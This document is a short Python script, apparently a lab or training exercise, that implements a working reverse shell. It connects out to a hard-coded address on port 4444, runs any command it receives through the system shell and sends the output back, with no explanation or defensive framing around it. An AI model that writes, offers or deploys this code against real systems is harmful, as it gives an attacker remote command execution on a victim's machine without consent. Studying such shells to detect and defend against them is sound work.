import socket
import subprocess

ip = "192.168.2.129"
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

while True:
    command = s.recv(1024).decode()

    if command.lower() == "exit":
        break
    
    try:
        result = subprocess.check_output(command, shell=True)
        s.send(result)
    except subprocess.CalledProcessError as e:
        s.send(str(e).encode())
    
    command = ""
